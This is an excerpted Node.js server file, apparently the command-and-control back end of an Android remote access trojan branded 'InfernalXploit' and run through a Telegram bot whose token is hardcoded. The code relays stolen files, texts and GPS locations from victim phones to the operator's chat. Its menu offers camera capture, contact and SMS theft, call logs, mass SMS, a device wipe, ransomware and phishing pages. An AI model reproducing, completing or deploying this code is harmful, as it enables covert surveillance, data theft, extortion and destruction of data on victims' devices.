...
const token = '7622154260:AAGUIFhhx5pSLZDaLCZkR1GFoFNPInHrciM'
const id = '544200952'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘽𝙚𝙧𝙟𝙖𝙡𝙖𝙣✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Pastikan Halaman Ini Aktif</p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𓃥𝙋𝙚𝙨𝙖𝙣 𝘿𝙖𝙧𝙞 𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𓃥𝙋𝙚𝙨𝙖𝙣 𝘿𝙖𝙧𝙞 𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙠𝙖𝙨𝙞 𝘿𝙖𝙧𝙞 𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 <b>${req.headers.model}</b>`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    ...
    appBot.sendMessage(id,
        `°• 🤠𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙏𝙚𝙧𝙨𝙖𝙢𝙗𝙪𝙣𝙜🤠\n\n` +
        `• ᴍᴏᴅᴇʟ ᴘᴇʀᴀɴɢᴋᴀᴛ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴇʀᴀɪ : <b>${battery}</b>\n` +
        `• ᴠᴇʀꜱɪ ᴀɴᴅʀᴏɪᴅ : <b>${version}</b>\n` +
        `• ᴋᴇᴄᴇʀᴀʜᴀɴ ʟᴀʏᴀʀ : <b>${brightness}</b>\n` +
        `• ᴋᴇᴄᴇʀᴀʜᴀɴ ʟᴀʏᴀʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙎𝙞𝙡𝙖𝙠𝙖𝙣 𝙗𝙖𝙡𝙖𝙨 𝙙𝙚𝙣𝙜𝙖𝙣 𝙣𝙤𝙢𝙤𝙧 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝘼𝙣𝙙𝙖 𝙠𝙞𝙧𝙞𝙢')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝘽𝙖𝙜𝙪𝙨, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝘼𝙣𝙙𝙖 𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 𝙞𝙣𝙞\n\n' +
                '• ʙᴇʀʜᴀᴛɪ ʜᴀᴛɪʟᴀʜ, ᴘᴇꜱᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴊɪᴋᴀ ᴍᴇʟᴇʙɪʜɪ ᴋᴀʀᴀᴋᴛᴇʀ ʏᴀɴɢ ᴅɪ ɪᴊɪɴᴋᴀɴ.',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝘽𝙖𝙜𝙪𝙨, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝘼𝙣𝙙𝙖 𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 𝙞𝙣𝙞')) {
            ...
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⌛𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙣𝙢𝙪 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞 𝙥𝙧𝙤𝙨𝙚𝙨⏳\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ ꜱᴀᴀᴛ ᴋᴇ ᴅᴇᴘᴀɴ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙏𝙚𝙧𝙨𝙖𝙢𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙋𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝘼𝙣𝙙𝙖 𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠')) {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 🪴𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢  SADAP OR RAT INFERNALXPLOIT🪴\n\n' +
                ...
                '• Author👉 @Author InfernalXploit X Tim Shadow India \n\n' +
        ...
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    ...
                    [
                        {text: '📂𝗔𝗠𝗕𝗜𝗟 𝗙𝗜𝗟𝗘📂', callback_data: `file:${uuid}`},
                        {text: '👹𝗛𝗔𝗣𝗨𝗦 𝗙𝗜𝗟𝗘👹', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                    ...
                    [
                        {text: '🔰𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚🔰', callback_data: `camera_main:${uuid}`},
                        {text: '🎪𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡🎪', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '🌐𝗟𝗢𝗞𝗔𝗦𝗜🌐', callback_data: `location:${uuid}`},
                        {text: '🗯️𝗧𝗢𝗔𝗦𝗧🗯️', callback_data: `toast:${uuid}`}
                    ],
                     [
                        {text: '📮𝗔𝗠𝗕𝗜𝗟 𝗣𝗘𝗠𝗕𝗔𝗬𝗔𝗥𝗔𝗡📮', callback_data: `Settings:${uuid}`},
                        {text: '☢️𝗥𝗘𝗦𝗘𝗧 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧☢️', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
                        {text: '☃️𝗥𝗜𝗪𝗔𝗬𝗔𝗧 𝗣𝗔𝗡𝗚𝗚𝗜𝗟𝗔𝗡☃️', callback_data: `calls:${uuid}`},
                        {text: '🏆𝗞𝗢𝗡𝗧𝗔𝗞🏆', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '⏲️𝗚𝗘𝗧𝗔𝗥𝗞𝗔𝗡⏲️', callback_data: `vibrate:${uuid}`},
                        {text: '🔔𝗧𝗔𝗠𝗣𝗜𝗟𝗞𝗔𝗡 𝗡𝗢𝗧𝗜𝗙🔔', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '🧊𝗣𝗘𝗦𝗔𝗡 𝗦𝗠𝗦🧊', callback_data: `messages:${uuid}`},
                        {text: '🎁𝗞𝗜𝗥𝗜𝗠 𝗦𝗠𝗦🎁', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🚸𝗥𝗔𝗡𝗦𝗢𝗠𝗪𝗔𝗥𝗘🚸', callback_data: `Ransomware:${uuid}`},
                        {text: '✳️𝗣𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗣𝗔𝗚𝗘✳️', callback_data: `custom_phishing:${uuid}`},
                    ],
                    [
                        {text: '🦞𝗣𝗨𝗧𝗔𝗥 𝗔𝗨𝗗𝗜𝗢🦞', callback_data: `play_audio:${uuid}`},
                        {text: '☯️𝗠𝗔𝗧𝗜𝗞𝗔𝗡 𝗔𝗨𝗗𝗜𝗢☯️', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '⛔‼️𝗞𝗜𝗥𝗜𝗠 𝗦𝗠𝗦 𝗞𝗘 𝗦𝗘𝗠𝗨𝗔 𝗞𝗢𝗡𝗧𝗔𝗞‼️⛔',
